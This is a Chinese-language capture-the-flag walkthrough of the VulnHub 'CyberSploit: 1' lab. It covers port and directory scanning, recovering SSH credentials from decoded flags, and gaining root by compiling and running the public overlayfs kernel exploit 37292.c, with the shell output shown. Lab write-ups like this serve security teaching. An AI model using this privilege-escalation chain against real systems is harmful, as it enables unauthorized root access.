# CyberSploit: 1

2024-5-18 https://www.vulnhub.com/entry/cybersploit-1,506/

difficulty: BEGINNER

## IP

192.168.5.22

## Scan

Open Port -> 22,80

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 011bc8fe18712860846a9f303511663d (DSA)
|   2048 d95314a37f9951403f49efef7f8b35de (RSA)
|_  256 ef435bd0c0ebee3e76615c6dce15fe7e (ECDSA)
80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))
|_http-title: Hello Pentester!
|_http-server-header: Apache/2.2.22 (Ubuntu)
```

80 web 主页上没什么信息，使用目录扫描：

```
http://192.168.5.22/index                (Status: 200) [Size: 2333]
http://192.168.5.22/index.html           (Status: 200) [Size: 2333]
http://192.168.5.22/robots               (Status: 200) [Size: 79]
http://192.168.5.22/robots.txt           (Status: 200) [Size: 79]
http://192.168.5.22/hacker               (Status: 200) [Size: 3757743]
```

http://192.168.5.22/robots.txt 中是一串字符串：

```
R29vZCBXb3JrICEKRmxhZzE6IGN5YmVyc3Bsb2l0e3lvdXR1YmUuY29tL2MvY3liZXJzcGxvaXR9

Good Work !
Flag1: cybersploit{youtube.com/c/cybersploit}
```

在 index.html 源代码中，发现了提示：

```
<!-------------username:itsskv--------------------->
```

用户应该是 ssh 用户，但是不知道密码，尝试下用 rockyou 进行爆破，没有成功。

其他的方向也没有思路，现在只获得了一个 username 和 一个 flag 值，有没有可能这个 flag 就是 ssh 的密码，尝试进行登陆下，果然能登陆，这个设计也太 fuck 了。

用户凭据 itsskv:cybersploit{youtube.com/c/cybersploit}

得到了 flag2 的值：

```
itsskv@cybersploit-CTF:~$ cat flag2.txt
01100111 01101111 01101111 01100100 00100000 01110111 01101111 01110010 01101011 00100000 00100001 00001010 01100110 01101100 01100001 01100111 00110010 00111010 00100000 01100011 01111001 01100010 01100101 01110010 01110011 01110000 01101100 01101111 01101001 01110100 01111011 01101000 01110100 01110100 01110000 01110011 00111010 01110100 00101110 01101101 01100101 00101111 01100011 01111001 01100010 01100101 01110010 01110011 01110000 01101100 01101111 01101001 01110100 00110001 01111101
```

看样子需要将二进制进行 binary 转换，得到：

```
good work !
flag2: cybersploit{https:t.me/cybersploit1}
```

最后一个 flag 应该是在/root 中，需要进行 root 提权了。

sudo 没有任何显示，看看其他的提权方向。

看看内核版本，可能存在内核提权漏洞。

Linux cybersploit-CTF 3.13.0-32-generic #57~precise1-Ubuntu SMP Tue Jul 15 03:50:54 UTC 2014 i686 i686 i386 GNU/Linux

可以找到：Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation | linux/local/37292.c

下载到目标机器，进行编译执行：

```
itsskv@cybersploit-CTF:/tmp$ gcc 37292.c -o ofs
itsskv@cybersploit-CTF:/tmp$ id
uid=1001(itsskv) gid=1001(itsskv) groups=1001(itsskv)
itsskv@cybersploit-CTF:/tmp$ ./ofs
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
# id
uid=0(root) gid=0(root) groups=0(root),1001(itsskv)
```

最终获得第 3 个 flag：

```
# cat finalflag.txt
  ______ ____    ____ .______    _______ .______          _______..______    __        ______    __  .___________.
 /      |\   \  /   / |   _  \  |   ____||   _  \        /       ||   _  \  |  |      /  __  \  |  | |           |
|  ,----' \   \/   /  |  |_)  | |  |__   |  |_)  |      |   (----`|  |_)  | |  |     |  |  |  | |  | `---|  |----`
|  |       \_    _/   |   _  <  |   __|  |      /        \   \    |   ___/  |  |     |  |  |  | |  |     |  |
|  `----.    |  |     |  |_)  | |  |____ |  |\  \----.----)   |   |  |      |  `----.|  `--'  | |  |     |  |
 \______|    |__|     |______/  |_______|| _| `._____|_______/    | _|      |_______| \______/  |__|     |__|


   _   _   _   _   _   _   _   _   _   _   _   _   _   _   _
  / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \
 ( c | o | n | g | r | a | t | u | l | a | t | i | o | n | s )
  \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/

flag3: cybersploit{Z3X21CW42C4 many many congratulations !}

if you like it share with me https://twitter.com/cybersploit1.

Thanks !
```
